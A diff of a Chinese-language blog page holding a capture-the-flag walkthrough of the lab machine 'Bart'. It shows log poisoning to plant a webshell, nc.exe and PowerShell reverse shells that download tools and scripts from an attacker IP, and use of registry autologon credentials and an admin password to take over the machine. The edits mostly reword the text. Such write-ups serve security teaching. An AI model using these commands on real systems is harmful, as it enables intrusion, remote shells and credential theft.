+<h3 id="js代码分析"><a href="#js代码分析" class="headerlink" title="js代码分析"></a>js代码分析</h3><p>查看页面源代码发现其中存在 JavaScript 代码</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saveChat</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="comment">// create a serialized object and send to log_chat.php. Once done hte XHR request, alert &quot;Done&quot;</span></span><br><span class="line">	<span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">	xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (xhr.readyState == XMLHttpRequest.DONE) &#123;</span><br><span class="line">       		alert(xhr.responseText);</span><br><span class="line">    	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;http://internal-01.bart.htb/log/log.php?filename=log.txt&amp;username=harvey&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">	xhr.send(<span class="literal">null</span>);</span><br><span class="line">	alert(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">&#125;			</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%883.08.46.png" alt="截屏2021-10-21 下午3.08.46"><br>经过测试发现当用户点击 log 时，就会弹出<code>Done</code>并随后弹出数字1。因为变量 xhr 是由三个参数进行调用，当该参数为 true 时调用异步模式，脚本完成会提示<code>Done</code>。如果收到http响应时，则会调用<code>xhr.onreadystatechange</code>函数并进行提示。与此同时会将请求包直接记录到日志当中。</p>
 <h4 id="日志记录获取webshell"><a href="#日志记录获取webshell" class="headerlink" title="日志记录获取webshell"></a>日志记录获取webshell</h4><p>访问<code>http://internal-01.bart.htb/log/log.txt</code>，发现它记录了用户请求时间、参数以及<code>user-agent</code>等请求信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%883.22.43.png" alt="截屏2021-10-21 下午3.22.43"></p>
@@ -229,7 +240,7 @@
 <p>访问木马地址<code>http://internal-01.bart.htb/log/mac1.php?cmd=whoami</code>，可成功执行命令<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%884.11.50.png" alt="截屏2021-10-21 下午4.11.50"></p>
 <h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>使用 nishang 中的 Invoke-PowerShellTcp.ps1 脚本来构造反弹</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /root/Desktop/nishang/Shells/Invoke-PowerShellTcp.ps1 . </span><br></pre></td></tr></table></figure>
-<p>在脚本最终添加需要反弹的地址和端口</p>
+<p>在脚本最后添加需要反弹的地址和端口</p>
 <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">Invoke-PowerShellTcp</span> <span class="string">-Reverse</span> <span class="string">-IPAddress</span> <span class="number">10.10</span><span class="number">.14</span><span class="number">.3</span> <span class="string">-Port</span> <span class="number">5555</span></span><br></pre></td></tr></table></figure>
 <p>使用 python 开启 http 服务</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
@@ -243,13 +254,14 @@
 <p>但以上是cmd命令，而目前所处环境为powershell，因此需替换为powershell命令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ItemProperty -Path <span class="string">&#x27;Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&#x27;</span> | select <span class="string">&quot;Default*&quot;</span></span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%884.51.42.png" alt="截屏2021-10-21 下午4.51.42"></p>
-<p>但是结果显示为空，我们可再构造一个cmd的shell，首先上传 nc.exe</p>
+<p>结果显示为空，尝试构造一个cmd的shell，上传 nc.exe</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -Command (new-object System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://10.10.14.3/nc.exe&#x27;</span>,<span class="string">&#x27;nc.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%884.35.39.png" alt="截屏2021-10-21 下午4.35.39"><br>在本地监听7777端口</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%884.35.39.png" alt="截屏2021-10-21 下午4.35.39"></p>
+<p>在本地监听7777端口</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 7777</span><br></pre></td></tr></table></figure>
 <p>在靶机中执行反弹命令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\nc.exe -e cmd.exe 10.10.14.3 7777</span><br></pre></td></tr></table></figure>
-<p>成功拿到cmd窗口，同时查询操作系统版本发现目标为Windows 10 Pro<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%884.45.27.png" alt="截屏2021-10-21 下午4.45.27"></p>
+<p>成功拿到cmd窗口，同时查询操作系统版本为 Windows 10 Pro<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%884.45.27.png" alt="截屏2021-10-21 下午4.45.27"></p>
 <p>但查询凭据后还是为空，说明并不是命令的问题。那到底是为什么找不到凭据呢？继续猜测可能是机器出了问题，但是后来发现并不是这样。真正原因是因为我们获取到的 shell 是32位的，而以上命令只能于64位 shell 中查询。<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%884.46.35.png" alt="截屏2021-10-21 下午4.46.35"></p>
 <p>那么我们切换64位版本 nc 来反弹并上传 nc64.exe</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -Command (new-object System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://10.10.14.3/nc64.exe&#x27;</span>,<span class="string">&#x27;nc64.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
@@ -268,12 +280,14 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="string">&quot;BART\Administrator&quot;</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;3130438f31186fbaf962f407711faddb&quot;</span></span><br><span class="line"><span class="variable">$secstr</span> = New-Object -TypeName System.Security.SecureString</span><br><span class="line"><span class="variable">$password</span>.ToCharArray() | ForEach-Object &#123;<span class="variable">$secstr</span>.AppendChar(<span class="variable">$_</span>)&#125;</span><br><span class="line"><span class="variable">$cred</span> = new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="variable">$username</span>, <span class="variable">$secstr</span></span><br><span class="line">Invoke-Command -ScriptBlock &#123; IEX(New-Object Net.WebClient).downloadString(<span class="string">&#x27;http://10.10.14.3/shell.ps1&#x27;</span>) &#125; -Credential <span class="variable">$cred</span> -Computer localhost</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%885.25.49.png" alt="截屏2021-10-21 下午5.25.49"><br>成功拿到反弹shell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%885.26.02.png" alt="截屏2021-10-21 下午5.26.02"><br>分别在用户<code>h.potter</code>和管理员的桌面上寻找flag</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\h.potter\</span><br><span class="line"><span class="built_in">type</span> c:\Users\h.potter\user.txt</span><br><span class="line">dir c:\Users\administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
-<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%885.29.23.png" alt="截屏2021-10-21 下午5.29.23"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%885.30.28.png" alt="截屏2021-10-21 下午5.30.28"><br>成功拿到两个flag</p>
-<h3 id="默认共享连接"><a href="#默认共享连接" class="headerlink" title="默认共享连接"></a>默认共享连接</h3><p>当然我们也可以通过默认共享的方式连接在当前shell环境下拿到管理员权限</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%885.29.23.png" alt="截屏2021-10-21 下午5.29.23"></p>
+<p>成功拿到两个flag</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%885.30.28.png" alt="截屏2021-10-21 下午5.30.28"></p>
+<h3 id="默认共享连接"><a href="#默认共享连接" class="headerlink" title="默认共享连接"></a>默认共享连接</h3><p>当然也可以利用默认共享的方式连接在当前shell环境下拿到管理员权限</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use x: \\localhost\c$ /user:administrator 3130438f31186fbaf962f407711faddb</span><br><span class="line">x:</span><br><span class="line"><span class="built_in">cd</span> \Users\administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> root.txt</span><br></pre></td></tr></table></figure>
 <p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/d7f2b8e2/%E6%88%AA%E5%B1%8F2021-10-21%20%E4%B8%8B%E5%8D%886.26.52.png" alt="截屏2021-10-21 下午6.26.52"></p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>该靶机主要考验我们的信息收集能力，直接访问站点会跳转至域名，因此我们我们需要通过域名解析才能成功访问站点。在目录扫描过程中发现存在子域名monitor，同样将其添加至域名解析中，访问monitor是一个监控管理界面，我们利用从主站点拿到的用户信息作为账号和cewl爬取的字符作为密码进行爆破，爆破成功后可使用harvey登陆监控系统。</p>
-<p>该系统中存在javascript代码，通过分析后我们可利用日志接口上传木马，并通过站点木马拿到反弹shell。靶机的注册表中存在管理员自动登陆凭证，利用该登陆凭证可成功上线管理员。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>Bart主要涉及到域名解析问题，如果直接访问站点会重定向至目标域名<code>bart.htb</code>，因此需要修改hosts文件才能正常访问站点，而在之后的信息收集中发现诸多子域名，同样也需要通过域名解析才能访问。monitor子域名为监控管理系统，使用 cewl 爬取主站字符作为密码字典，以主站用户为账号字典对其进行爆破，成功拿到账号密码。利用该账号密码成功登录监控管理系统，在其中发现 internal-01子域名，访问后为内部聊天系统。</p>
+<p>内部聊天系统存在两种方式进行登录，一是通过字典暴力破解；二是通过注册功能注册一个新用户。进入系统后分析其中 JS 代码，其日志接口存在漏洞，我们可利用该漏洞上传木马文件并最终拿到反弹shell。在服务器的注册表中存在管理员自动登录凭证，利用它可成功上线管理员用户，除此之外还可以通过默认共享来访问目标系统，同样能够拿到对应flag。</p>
 
 
 <div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
@@ -508,4 +522,4 @@
   </div>
 </body>
 </html>
-</html>
+ml>
